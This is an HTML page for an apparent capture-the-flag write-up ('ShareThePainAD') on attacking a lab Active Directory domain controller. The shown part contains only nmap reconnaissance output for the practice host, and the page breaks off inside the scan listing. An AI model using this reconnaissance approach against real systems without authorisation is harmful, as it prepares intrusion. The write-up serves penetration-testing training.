@@ -1,0 +1,1167 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="\n#\rSolution\r#\rFinding Credentials\rnmap shows SMB and WinRM are open. It also gives us the domain and FQDN.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 126 Simple DNS Plus 88/tcp open kerberos-sec syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-09-21 15:39:22Z) 135/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 126 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? syn-ack ttl 126 464/tcp open kpasswd5? syn-ack ttl 126 593/tcp open ncacn_http syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 126 3268/tcp open ldap syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hack.smarter0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 126 3389/tcp open ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services | ssl-cert: Subject: commonName=DC01.hack.smarter | Issuer: commonName=DC01.hack.smarter | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2025-09-05T03:46:00 | Not valid after: 2026-03-07T03:46:00 | MD5: 4b40:6c01:63f1:81e4:4f56:64b7:8ef3:4bbc | SHA-1: 2ad1:c7dc:ab46:ae72:570a:ea85:2192:51cf:1707:3692 | -----BEGIN CERTIFICATE----- | MIIC5jCCAc6gAwIBAgIQL7/TDfsBKaJEuIxvqLtNeDANBgkqhkiG9w0BAQsFADAc | MRowGAYDVQQDExFEQzAxLmhhY2suc21hcnRlcjAeFw0yNTA5MDUwMzQ2MDBaFw0y | NjAzMDcwMzQ2MDBaMBwxGjAYBgNVBAMTEURDMDEuaGFjay5zbWFydGVyMIIBIjAN | BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAr/z97jkoYVuqCfcPuR2gCVRNgSK+ | MB7v2Nxa64USo34Z8OzT758ox5d7FFrmZSm3A0bvUNtVYjw4qAekjAYNCSCZO1JI | GVDjieej7jRyApmXOCnV82Pp0pDZuc/v8hg1X1JNeXlI4vgi4cVXIQk2Cg6ljjap | DRcm2JARZ8gNFvn/VbDTBpipp2nFIENtCM0wwslxI4SGbx8+GisHqOwt0tbelpuL | JQ+uQPoddL45Fz7uQ/Pp/5nnqmtR/6yAR2jFir3v5/hZ7zycPCTlAocRth6azFW2 | UTke69SByvN+BJdgP2QbyXWcJHwX0GatenQCzht4ZCq0O2CsX9+7+lPKbQIDAQAB | oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN | AQELBQADggEBAAVQZIet+fvKcDwhSGcITFyO7RHjL51Q0aauioSdlow50XVGZ8vW | ptOhb5GwWmGfo8abmKZO8mqK/SkaNU6pA7zwvBHVUqwWF2bMKyWKMBLOB0VIQaxT | ZfV0LL8KR3oCs1fuC60rxDF8JIEne9vgL5z+dmgxXd6SZJf1//ZPjmUf7ai3ohtg | MRq87WZuf2P7m2rZaPcIcyMDM0Zt5MSGr+bD9V2AboDrKh6TYrz4ODkNPUbeGyT/ | q57XlN2ERF6OYCYAGpLdCDxHmAhQhihKbxtnC4vwhUCaXnDUSD2v+9WYbrFmWMNl | UCJT2ircDq6fnW4O9KJJhg5udslgzhQcT3Y= |_-----END CERTIFICATE----- | rdp-ntlm-info: | Target_Name: HACK | NetBIOS_Domain_Name: HACK | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: hack.smarter | DNS_Computer_Name: DC01.hack.smarter | DNS_Tree_Name: hack.smarter | Product_Version: 10.0.20348 |_ System_Time: 2025-09-21T15:40:10+00:00 |_ssl-date: 2025-09-21T15:40:19+00:00; -1s from scanner time. 5985/tcp open http syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf syn-ack ttl 126 .NET Message Framing 49664/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC 49665/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC 49666/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC 49669/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC 49671/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC 49675/tcp open ncacn_http syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0 49711/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC 49837/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -1s, deviation: 0s, median: -1s | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 33722/tcp): CLEAN (Couldn&#39;t connect) | Check 2 (port 13752/tcp): CLEAN (Couldn&#39;t connect) | Check 3 (port 4466/udp): CLEAN (Timeout) | Check 4 (port 31274/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-time: | date: 2025-09-21T15:40:11 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required We add the domain and FQDN to /etc/hosts.\n">
+<title>ShareThePainAD</title>
+
+<link rel='canonical' href='http://localhost:1313/p/sharethepainad/'> 
+<link rel="stylesheet" href="/scss/style.min.7e25752da02be3d43ff6eb2384c8a9c2c26ecf308b9cb3b7bd8c7ae7562e6e6e.css" />
+<meta property='og:title' content="ShareThePainAD">
+<meta property='og:description' content="\n#\rSolution\r#\rFinding Credentials\rnmap shows SMB and WinRM are open. It also gives us the domain and FQDN.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 126 Simple DNS Plus 88/tcp open kerberos-sec syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-09-21 15:39:22Z) 135/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 126 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? syn-ack ttl 126 464/tcp open kpasswd5? syn-ack ttl 126 593/tcp open ncacn_http syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 126 3268/tcp open ldap syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hack.smarter0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 126 3389/tcp open ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services | ssl-cert: Subject: commonName=DC01.hack.smarter | Issuer: commonName=DC01.hack.smarter | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2025-09-05T03:46:00 | Not valid after: 2026-03-07T03:46:00 | MD5: 4b40:6c01:63f1:81e4:4f56:64b7:8ef3:4bbc | SHA-1: 2ad1:c7dc:ab46:ae72:570a:ea85:2192:51cf:1707:3692 | -----BEGIN CERTIFICATE----- | MIIC5jCCAc6gAwIBAgIQL7/TDfsBKaJEuIxvqLtNeDANBgkqhkiG9w0BAQsFADAc | MRowGAYDVQQDExFEQzAxLmhhY2suc21hcnRlcjAeFw0yNTA5MDUwMzQ2MDBaFw0y | NjAzMDcwMzQ2MDBaMBwxGjAYBgNVBAMTEURDMDEuaGFjay5zbWFydGVyMIIBIjAN | BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAr/z97jkoYVuqCfcPuR2gCVRNgSK+ | MB7v2Nxa64USo34Z8OzT758ox5d7FFrmZSm3A0bvUNtVYjw4qAekjAYNCSCZO1JI | GVDjieej7jRyApmXOCnV82Pp0pDZuc/v8hg1X1JNeXlI4vgi4cVXIQk2Cg6ljjap | DRcm2JARZ8gNFvn/VbDTBpipp2nFIENtCM0wwslxI4SGbx8+GisHqOwt0tbelpuL | JQ+uQPoddL45Fz7uQ/Pp/5nnqmtR/6yAR2jFir3v5/hZ7zycPCTlAocRth6azFW2 | UTke69SByvN+BJdgP2QbyXWcJHwX0GatenQCzht4ZCq0O2CsX9+7+lPKbQIDAQAB | oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN | AQELBQADggEBAAVQZIet+fvKcDwhSGcITFyO7RHjL51Q0aauioSdlow50XVGZ8vW | ptOhb5GwWmGfo8abmKZO8mqK/SkaNU6pA7zwvBHVUqwWF2bMKyWKMBLOB0VIQaxT | ZfV0LL8KR3oCs1fuC60rxDF8JIEne9vgL5z+dmgxXd6SZJf1//ZPjmUf7ai3ohtg | MRq87WZuf2P7m2rZaPcIcyMDM0Zt5MSGr+bD9V2AboDrKh6TYrz4ODkNPUbeGyT/ | q57XlN2ERF6OYCYAGpLdCDxHmAhQhihKbxtnC4vwhUCaXnDUSD2v+9WYbrFmWMNl | UCJT2ircDq6fnW4O9KJJhg5udslgzhQcT3Y= |_-----END CERTIFICATE----- | rdp-ntlm-info: | Target_Name: HACK | NetBIOS_Domain_Name: HACK | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: hack.smarter | DNS_Computer_Name: DC01.hack.smarter | DNS_Tree_Name: hack.smarter | Product_Version: 10.0.20348 |_ System_Time: 2025-09-21T15:40:10+00:00 |_ssl-date: 2025-09-21T15:40:19+00:00; -1s from scanner time. 5985/tcp open http syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf syn-ack ttl 126 .NET Message Framing 49664/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC 49665/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC 49666/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC 49669/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC 49671/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC 49675/tcp open ncacn_http syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0 49711/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC 49837/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -1s, deviation: 0s, median: -1s | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 33722/tcp): CLEAN (Couldn&#39;t connect) | Check 2 (port 13752/tcp): CLEAN (Couldn&#39;t connect) | Check 3 (port 4466/udp): CLEAN (Timeout) | Check 4 (port 31274/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-time: | date: 2025-09-21T15:40:11 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required We add the domain and FQDN to /etc/hosts.\n">
+<meta property='og:url' content='http://localhost:1313/p/sharethepainad/'>
+<meta property='og:site_name' content='Blue Pho3nix'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Medium' /><meta property='article:tag' content='Windows' /><meta property='article:tag' content='OSCP Prep' /><meta property='og:image' content='http://localhost:1313/p/sharethepainad/img/hack-smarter.png' />
+<meta name="twitter:title" content="ShareThePainAD">
+<meta name="twitter:description" content="\n#\rSolution\r#\rFinding Credentials\rnmap shows SMB and WinRM are open. It also gives us the domain and FQDN.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 126 Simple DNS Plus 88/tcp open kerberos-sec syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-09-21 15:39:22Z) 135/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 126 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? syn-ack ttl 126 464/tcp open kpasswd5? syn-ack ttl 126 593/tcp open ncacn_http syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 126 3268/tcp open ldap syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hack.smarter0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 126 3389/tcp open ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services | ssl-cert: Subject: commonName=DC01.hack.smarter | Issuer: commonName=DC01.hack.smarter | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2025-09-05T03:46:00 | Not valid after: 2026-03-07T03:46:00 | MD5: 4b40:6c01:63f1:81e4:4f56:64b7:8ef3:4bbc | SHA-1: 2ad1:c7dc:ab46:ae72:570a:ea85:2192:51cf:1707:3692 | -----BEGIN CERTIFICATE----- | MIIC5jCCAc6gAwIBAgIQL7/TDfsBKaJEuIxvqLtNeDANBgkqhkiG9w0BAQsFADAc | MRowGAYDVQQDExFEQzAxLmhhY2suc21hcnRlcjAeFw0yNTA5MDUwMzQ2MDBaFw0y | NjAzMDcwMzQ2MDBaMBwxGjAYBgNVBAMTEURDMDEuaGFjay5zbWFydGVyMIIBIjAN | BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAr/z97jkoYVuqCfcPuR2gCVRNgSK+ | MB7v2Nxa64USo34Z8OzT758ox5d7FFrmZSm3A0bvUNtVYjw4qAekjAYNCSCZO1JI | GVDjieej7jRyApmXOCnV82Pp0pDZuc/v8hg1X1JNeXlI4vgi4cVXIQk2Cg6ljjap | DRcm2JARZ8gNFvn/VbDTBpipp2nFIENtCM0wwslxI4SGbx8+GisHqOwt0tbelpuL | JQ+uQPoddL45Fz7uQ/Pp/5nnqmtR/6yAR2jFir3v5/hZ7zycPCTlAocRth6azFW2 | UTke69SByvN+BJdgP2QbyXWcJHwX0GatenQCzht4ZCq0O2CsX9+7+lPKbQIDAQAB | oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN | AQELBQADggEBAAVQZIet+fvKcDwhSGcITFyO7RHjL51Q0aauioSdlow50XVGZ8vW | ptOhb5GwWmGfo8abmKZO8mqK/SkaNU6pA7zwvBHVUqwWF2bMKyWKMBLOB0VIQaxT | ZfV0LL8KR3oCs1fuC60rxDF8JIEne9vgL5z+dmgxXd6SZJf1//ZPjmUf7ai3ohtg | MRq87WZuf2P7m2rZaPcIcyMDM0Zt5MSGr+bD9V2AboDrKh6TYrz4ODkNPUbeGyT/ | q57XlN2ERF6OYCYAGpLdCDxHmAhQhihKbxtnC4vwhUCaXnDUSD2v+9WYbrFmWMNl | UCJT2ircDq6fnW4O9KJJhg5udslgzhQcT3Y= |_-----END CERTIFICATE----- | rdp-ntlm-info: | Target_Name: HACK | NetBIOS_Domain_Name: HACK | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: hack.smarter | DNS_Computer_Name: DC01.hack.smarter | DNS_Tree_Name: hack.smarter | Product_Version: 10.0.20348 |_ System_Time: 2025-09-21T15:40:10+00:00 |_ssl-date: 2025-09-21T15:40:19+00:00; -1s from scanner time. 5985/tcp open http syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf syn-ack ttl 126 .NET Message Framing 49664/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC 49665/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC 49666/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC 49669/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC 49671/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC 49675/tcp open ncacn_http syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0 49711/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC 49837/tcp open msrpc syn-ack ttl 126 Microsoft Windows RPC Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -1s, deviation: 0s, median: -1s | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 33722/tcp): CLEAN (Couldn&#39;t connect) | Check 2 (port 13752/tcp): CLEAN (Couldn&#39;t connect) | Check 3 (port 4466/udp): CLEAN (Timeout) | Check 4 (port 31274/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-time: | date: 2025-09-21T15:40:11 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required We add the domain and FQDN to /etc/hosts.\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/p/sharethepainad/img/hack-smarter.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_2f3062cb4e01dc1b.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🔥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Blue Pho3nix</a></h1>
+            <h2 class="site-description">Learn cool stuff</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                
+                <span>Categories</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#finding-credentials">Finding Credentials</a></li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+    
+   
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hack-smarter/" style="background-color: ; color: #fff;">
+                Hack Smarter
+            </a>
+        
+        
+    <section class="article-tags">
+        
+            <a href="/tags/medium/">Medium</a>
+        
+            <a href="/tags/windows/">Windows</a>
+        
+            <a href="/tags/oscp-prep/">OSCP Prep</a>
+        
+    </section>
+
+
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/sharethepainad/">ShareThePainAD</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    5 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+
+    <section class="article-content">
+    
+    
+    <p><img src="/p/sharethepainad/img/intro.png"
+	width="957"
+	height="534"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="179"
+		data-flex-basis="430px"
+	
+></p>
+<h1 id="solution">
+    <a href="#solution" class="header-anchor">#</a>
+    Solution
+</h1><h2 id="finding-credentials">
+    <a href="#finding-credentials" class="header-anchor">#</a>
+    Finding Credentials
+</h2><p><code>nmap</code> shows SMB and WinRM are open. It also gives us the domain and FQDN.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PORT      STATE SERVICE       REASON          VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open  domain        syn-ack ttl <span class="m">126</span> Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  syn-ack ttl <span class="m">126</span> Microsoft Windows Kerberos <span class="o">(</span>server time: 2025-09-21 15:39:22Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         syn-ack ttl <span class="m">126</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   syn-ack ttl <span class="m">126</span> Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds? syn-ack ttl <span class="m">126</span>
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?     syn-ack ttl <span class="m">126</span>
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    syn-ack ttl <span class="m">126</span> Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp   open  tcpwrapped    syn-ack ttl <span class="m">126</span>
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          syn-ack ttl <span class="m">126</span> Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: hack.smarter0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3269/tcp  open  tcpwrapped    syn-ack ttl <span class="m">126</span>
+</span></span><span class="line"><span class="cl">3389/tcp  open  ms-wbt-server syn-ack ttl <span class="m">126</span> Microsoft Terminal Services
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.hack.smarter
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>DC01.hack.smarter
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
